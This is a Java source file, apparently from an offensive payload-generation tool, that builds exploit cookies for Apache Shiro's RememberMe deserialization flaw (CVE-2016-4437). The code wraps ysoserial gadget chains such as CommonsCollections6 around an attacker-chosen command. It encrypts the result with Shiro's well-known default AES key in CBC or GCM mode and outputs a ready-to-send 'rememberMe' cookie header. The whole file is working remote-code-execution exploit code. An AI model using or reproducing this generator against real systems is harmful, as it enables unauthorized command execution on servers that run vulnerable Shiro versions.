package com.oobx.chains;

import org.springframework.stereotype.Component;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Map;

/**
 * Shiro RememberMe cookie payload generator.
 * Wraps any ysoserial payload (CC6, CB1, Spring1 etc.) in AES-CBC or AES-GCM
 * encrypted cookie as used by Apache Shiro ≤1.2.4 (CVE-2016-4437 / Shiro-550/721).
 *
 * Uses the same AES logic as chains-core ShiroPayload but without the framework overhead.
 */
@Component
public class ShiroChainHandler implements ChainHandler {

    private final YsoserialHandler ysoHandler;

    public ShiroChainHandler(YsoserialHandler ysoHandler) {
        this.ysoHandler = ysoHandler;
    }

    @Override
    public PayloadResult generate(String chainId, Map<String, Object> params) throws Exception {
        String keyB64    = (String) params.getOrDefault("key_b64", "kPH+bIxk5D2deZiIxcaaaA==");
        String innerChain = (String) params.getOrDefault("chain", "CommonsCollections6");
        String cmd       = (String) params.getOrDefault("cmd", "id");
        String mode      = chainId.contains("gcm") ? "GCM" : "CBC";

        // Step 1: Generate inner serialized payload using ysoserial subprocess
        byte[] serialized = generateInnerPayload(innerChain, cmd, params);

        // Step 2: Encrypt with Shiro AES key
        byte[] key = Base64.getDecoder().decode(keyB64);
        byte[] encrypted = encryptShiro(serialized, key, mode);

        // Step 3: Base64 encode the final cookie value
        String cookieValue = Base64.getEncoder().encodeToString(encrypted);

        return new PayloadResult(
            "text/plain",
            cookieValue.getBytes(),
            Map.of(
                "cookie_header", "Cookie: rememberMe=" + cookieValue,
                "inner_chain", innerChain,
                "mode", "AES-" + mode,
                "note", "Set as HTTP Cookie header: rememberMe=<value>"
            )
        );
    }

    private byte[] generateInnerPayload(String chain, String cmd, Map<String, Object> params) throws Exception {
        // Map friendly/display names to canonical ysoserial chain IDs
        String ysoId = switch (chain.toLowerCase()) {
            case "cc6", "commonscollections6" -> "ysoserial_cc6";
            case "cc1", "commonscollections1" -> "ysoserial_cc1";
            case "cc2", "commonscollections2" -> "ysoserial_cc2";
            case "cc4", "commonscollections4" -> "ysoserial_cc4";
            case "cc7", "commonscollections7" -> "ysoserial_cc7";
            case "cb1", "commonsbeanutils1"   -> "ysoserial_cb1";
            case "spring1"                    -> "ysoserial_spring1";
            case "spring2"                    -> "ysoserial_spring2";
            case "rome"                       -> "ysoserial_rome";
            case "hibernate1"                 -> "ysoserial_hibernate1";
            default -> "ysoserial_" + chain.toLowerCase();
        };

        Map<String, Object> ysoParams = new java.util.HashMap<>(params);
        ysoParams.put("cmd", cmd);
        PayloadResult result = ysoHandler.generate(ysoId, ysoParams);
        return result.bytes();
    }

    private byte[] encryptShiro(byte[] plaintext, byte[] key, String mode) throws Exception {
        if ("GCM".equals(mode)) {
            return encryptGCM(plaintext, key);
        }
        return encryptCBC(plaintext, key);
    }

    private byte[] encryptCBC(byte[] plaintext, byte[] key) throws Exception {
        // Shiro CBC: iv (16 bytes) || AES-CBC(PKCS5Padding) ciphertext
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
        byte[] encrypted = cipher.doFinal(plaintext);

        byte[] result = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, result, 0, iv.length);
        System.arraycopy(encrypted, 0, result, iv.length, encrypted.length);
        return result;
    }

    private byte[] encryptGCM(byte[] plaintext, byte[] key) throws Exception {
        // Shiro GCM: iv (16 bytes) || AES-GCM(NoPadding) ciphertext+tag
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"),
            new javax.crypto.spec.GCMParameterSpec(128, iv));
        byte[] encrypted = cipher.doFinal(plaintext);

        byte[] result = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, result, 0, iv.length);
        System.arraycopy(encrypted, 0, result, iv.length, encrypted.length);
        return result;
    }
}
